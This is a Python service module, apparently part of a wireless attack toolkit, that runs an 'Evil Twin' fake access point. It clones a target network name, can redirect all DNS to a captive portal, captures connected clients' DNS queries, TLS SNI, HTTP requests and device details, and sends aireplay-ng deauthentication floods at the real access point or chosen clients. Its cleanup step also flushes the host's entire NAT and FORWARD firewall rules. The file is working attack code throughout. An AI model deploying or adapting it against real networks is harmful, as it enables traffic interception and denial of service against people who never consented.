"""
Enhanced Evil Twin AP service.

Features:
  - Evil Twin AP with hostapd + dnsmasq
  - Integrated deauth to force clients to reconnect
  - MITM traffic monitoring: captures DNS queries, TLS SNI, HTTP requests
    from clients connected to the fake AP (same technology as MITM stealth mode)
  - Standalone deauth endpoint (without starting full Evil Twin)
  - Real-time client list with MAC, IP, hostname, vendor
"""

import uuid
import asyncio
import json
import logging
import os
import shutil
import sys
from typing import Optional
from datetime import datetime
from pathlib import Path
from app.config import settings
from app.models.schemas import EvilTwinRequest
from app.utils.process_manager import process_manager

logger = logging.getLogger(__name__)

STEALTH_MONITOR = str(Path(__file__).parent.parent / "utils" / "mitm_stealth_monitor.py")


class EvilTwinService:
    def __init__(self):
        self._active_twin: Optional[dict] = None

    async def start(self, req: EvilTwinRequest) -> dict:
        twin_id = str(uuid.uuid4())[:8]
        hostapd_conf = settings.HOSTAPD_DIR / f"eviltwin_{twin_id}.conf"
        dnsmasq_conf = settings.HOSTAPD_DIR / f"dnsmasq_{twin_id}.conf"
        dnsmasq_log = str(settings.LOGS_DIR / f"dnsmasq_{twin_id}.log")
        flow_log = str(settings.CAPTURES_DIR / f"eviltwin_{twin_id}_flows.jsonl")
        pcap_file = str(settings.CAPTURES_DIR / f"eviltwin_{twin_id}.pcap")

        # Clean flow log
        with open(flow_log, "w"):
            pass

        logger.info(f"[{twin_id}] Starting Evil Twin: essid={req.target_essid} ch={req.channel} iface={req.interface}")

        # ── STEP 1: Write hostapd config ──
        with open(hostapd_conf, "w") as f:
            f.write(
                f"interface={req.interface}\n"
                f"driver=nl80211\n"
                f"ssid={req.target_essid}\n"
                f"hw_mode=g\n"
                f"channel={req.channel}\n"
                f"wmm_enabled=0\n"
                f"macaddr_acl=0\n"
                f"auth_algs=1\n"
                f"ignore_broadcast_ssid=0\n"
                f"wpa=0\n"
            )

        # ── STEP 2: Configure AP interface as gateway ──
        await process_manager.run_sync(["ip", "addr", "flush", "dev", req.interface], timeout=5)
        await process_manager.run_sync(["ip", "addr", "add", "10.0.0.1/24", "dev", req.interface], timeout=5)
        await process_manager.run_sync(["ip", "link", "set", req.interface, "up"], timeout=5)

        # ── STEP 3: Write dnsmasq config (DHCP + DNS) ──
        dns_content = (
            f"interface={req.interface}\n"
            f"bind-interfaces\n"
            f"dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h\n"
            f"dhcp-option=3,10.0.0.1\n"
            f"dhcp-option=6,10.0.0.1\n"
            f"server=8.8.8.8\n"
            f"server=1.1.1.1\n"
            f"log-queries\n"
            f"log-dhcp\n"
            f"log-facility={dnsmasq_log}\n"
        )
        if req.captive_portal:
            dns_content += "address=/#/10.0.0.1\n"
        with open(dnsmasq_conf, "w") as f:
            f.write(dns_content)

        # ── STEP 4: IP forwarding + NAT for internet access ──
        if req.internet_interface:
            await process_manager.run_sync(["sysctl", "-w", "net.ipv4.ip_forward=1"], timeout=5)
            await process_manager.run_sync([
                "iptables", "-t", "nat", "-A", "POSTROUTING",
                "-o", req.internet_interface, "-j", "MASQUERADE"
            ], timeout=5)
            await process_manager.run_sync([
                "iptables", "-A", "FORWARD", "-i", req.interface,
                "-o", req.internet_interface, "-j", "ACCEPT"
            ], timeout=5)
            await process_manager.run_sync([
                "iptables", "-A", "FORWARD", "-i", req.internet_interface,
                "-o", req.interface, "-m", "state",
                "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"
            ], timeout=5)

        # ── STEP 5: Launch dnsmasq ──
        asyncio.create_task(process_manager.run(
            ["dnsmasq", "-C", str(dnsmasq_conf), "-d"], timeout=None
        ))

        # ── STEP 6: Launch hostapd ──
        asyncio.create_task(process_manager.run(
            ["hostapd", str(hostapd_conf)], timeout=None
        ))

        # ── STEP 7: Start traffic monitor (DNS + TLS SNI + HTTP) ──
        monitor_active = False
        if shutil.which("tshark") and os.path.isfile(STEALTH_MONITOR):
            # Monitor the AP interface — captures all traffic from connected clients
            stealth_cmd = [
                sys.executable, STEALTH_MONITOR,
                "--interface", req.interface,
                "--targets", "10.0.0.0/24",  # all clients on AP network
                "--output", flow_log,
            ]
            asyncio.create_task(process_manager.run(stealth_cmd, timeout=None))
            monitor_active = True
            logger.info(f"[{twin_id}] Traffic monitor started (DNS + TLS SNI + HTTP)")
        else:
            logger.warning(f"[{twin_id}] tshark not available — no traffic monitoring")

        # ── STEP 8: tcpdump backup ──
        asyncio.create_task(process_manager.run([
            "tcpdump", "-i", req.interface, "-w", pcap_file, "-s", "0"
        ], timeout=None))

        # ── STEP 9: Optional deauth of legitimate AP ──
        if req.deauth_legitimate and req.deauth_interface and req.deauth_bssid:
            asyncio.create_task(process_manager.run([
                "aireplay-ng", "--deauth", str(req.deauth_packets),
                "-a", req.deauth_bssid, req.deauth_interface,
            ], timeout=60))
            logger.info(f"[{twin_id}] Deauth launched against legitimate AP {req.deauth_bssid}")

        self._active_twin = {
            "id": twin_id,
            "essid": req.target_essid,
            "channel": req.channel,
            "interface": req.interface,
            "ip": "10.0.0.1",
            "dhcp_range": "10.0.0.10-100",
            "internet_forwarding": req.internet_interface is not None,
            "internet_interface": req.internet_interface,
            "captive_portal": req.captive_portal,
            "deauth_active": req.deauth_legitimate,
            "flow_log": flow_log,
            "pcap_file": pcap_file,
            "dnsmasq_log": dnsmasq_log,
            "monitor_active": monitor_active,
            "started_at": datetime.now().isoformat(),
        }
        return self._active_twin

    async def stop(self) -> dict:
        results = []

        # Kill all related processes
        for proc in ["hostapd", "dnsmasq", "tcpdump", "aireplay-ng", "mitm_stealth_monitor"]:
            _, _, rc = await process_manager.run_sync(["pkill", "-f", proc], timeout=5)
            results.append({"process": proc, "killed": rc == 0})

        # Clean iptables
        await process_manager.run_sync(["iptables", "-t", "nat", "-F"], timeout=5)
        await process_manager.run_sync(["iptables", "-F", "FORWARD"], timeout=5)
        await process_manager.run_sync(["sysctl", "-w", "net.ipv4.ip_forward=0"], timeout=5)

        # Clean interface
        if self._active_twin:
            iface = self._active_twin.get("interface")
            if iface:
                await process_manager.run_sync(["ip", "addr", "flush", "dev", iface], timeout=5)

        twin = self._active_twin
        self._active_twin = None
        return {"stopped": True, "twin": twin, "cleanup": results}

    def status(self) -> dict:
        s = self._active_twin
        extra = {}
        if s:
            # Count flows
            flow_log = s.get("flow_log")
            if flow_log and os.path.exists(flow_log):
                try:
                    with open(flow_log) as f:
                        count = sum(1 for _ in f)
                    extra["total_flows"] = count
                    extra["log_size_bytes"] = os.path.getsize(flow_log)
                except Exception:
                    extra["total_flows"] = 0

            # Count connected clients (from DHCP leases)
            clients = self._get_connected_clients()
            extra["connected_clients"] = clients
            extra["client_count"] = len(clients)

        return {"active": s is not None, "twin": s, **extra}

    def _get_connected_clients(self) -> list:
        """Parse DHCP leases from dnsmasq log to get connected clients."""
        clients = []
        if not self._active_twin:
            return clients

        dnsmasq_log = self._active_twin.get("dnsmasq_log")
        if not dnsmasq_log or not os.path.exists(dnsmasq_log):
            return clients

        # Parse dnsmasq log for DHCPACK entries (successful leases)
        leases = {}
        try:
            with open(dnsmasq_log) as f:
                for line in f:
                    if "DHCPACK" in line:
                        # Format: "DHCPACK(wlan1) 10.0.0.50 aa:bb:cc:dd:ee:ff hostname"
                        parts = line.strip().split()
                        try:
                            idx = parts.index("DHCPACK(" + self._active_twin["interface"] + ")")
                        except ValueError:
                            # Try different format
                            idx = -1
                            for i, p in enumerate(parts):
                                if p.startswith("DHCPACK"):
                                    idx = i
                                    break
                            if idx == -1:
                                continue
                        if len(parts) > idx + 3:
                            ip = parts[idx + 1]
                            mac = parts[idx + 2]
                            hostname = parts[idx + 3] if len(parts) > idx + 3 else "unknown"
                            leases[mac] = {"ip": ip, "mac": mac, "hostname": hostname}
        except Exception as e:
            logger.warning(f"Could not parse DHCP log: {e}")

        return list(leases.values())

    async def get_flows(self, limit: int = 100, host_filter: str = None,
                        method_filter: str = None) -> dict:
        """Get captured flows from the Evil Twin traffic monitor."""
        if not self._active_twin:
            return {"error": "No active Evil Twin", "flows": []}

        flow_log = self._active_twin.get("flow_log")
        if not flow_log or not os.path.exists(flow_log):
            return {
                "flows": [], "total": 0, "showing": 0,
                "message": "Waiting for traffic from connected clients...",
                "stats": {"total_flows": 0, "unique_hosts": 0, "top_hosts": [],
                          "methods": {}, "client_count": 0},
            }

        # Read all flows
        all_flows = []
        try:
            with open(flow_log, "r") as f:
                for line in f:
                    line = line.strip()
                    if line:
                        try:
                            all_flows.append(json.loads(line))
                        except json.JSONDecodeError:
                            continue
        except Exception as e:
            return {"error": str(e), "flows": []}

        total = len(all_flows)

        # Filter (newest first)
        filtered = []
        for entry in reversed(all_flows):
            if host_filter and host_filter.lower() not in entry.get("host", "").lower():
                continue
            if method_filter and entry.get("method") != method_filter.upper():
                continue
            filtered.append(entry)

        showing = filtered[:limit]

        # Stats
        hosts, methods, clients = {}, {}, set()
        for fl in all_flows:
            h = fl.get("host", "unknown")
            hosts[h] = hosts.get(h, 0) + 1
            m = fl.get("method", "?")
            methods[m] = methods.get(m, 0) + 1
            if fl.get("client_ip"):
                clients.add(fl["client_ip"])

        top_hosts = sorted(hosts.items(), key=lambda x: x[1], reverse=True)[:20]

        return {
            "flows": showing,
            "total": total,
            "filtered": len(filtered),
            "showing": len(showing),
            "stats": {
                "total_flows": total,
                "unique_hosts": len(hosts),
                "top_hosts": [{"host": h, "count": c} for h, c in top_hosts],
                "methods": methods,
                "client_count": len(clients),
                "unique_clients": list(clients),
            },
        }

    # ═══════════════════════════════════════════════
    # Standalone deauth — no Evil Twin required
    # ═══════════════════════════════════════════════
    async def standalone_deauth(self, interface: str, target_bssid: str,
                                client_mac: str = None, packets: int = 50,
                                channel: int = None) -> dict:
        """
        Standalone deauth attack — without launching Evil Twin.
        Sends deauth packets to a specific client or broadcast to all clients of an AP.
        """
        # Fix channel if specified
        if channel:
            await process_manager.run_sync([
                "iwconfig", interface, "channel", str(channel)
            ], timeout=5)

        # Build aireplay-ng command
        cmd = [
            "aireplay-ng", "--deauth", str(packets),
            "-a", target_bssid,
        ]
        if client_mac:
            cmd.extend(["-c", client_mac])
        cmd.append(interface)

        logger.info(f"Standalone deauth: {' '.join(cmd)}")

        stdout, stderr, rc = await process_manager.run_sync(cmd, timeout=30)

        return {
            "success": rc == 0,
            "interface": interface,
            "target_bssid": target_bssid,
            "client_mac": client_mac if client_mac else "broadcast",
            "packets_sent": packets,
            "channel": channel,
            "output": stdout[:500] if stdout else "",
            "error": stderr[:500] if stderr and rc != 0 else None,
        }


evil_twin_service = EvilTwinService()
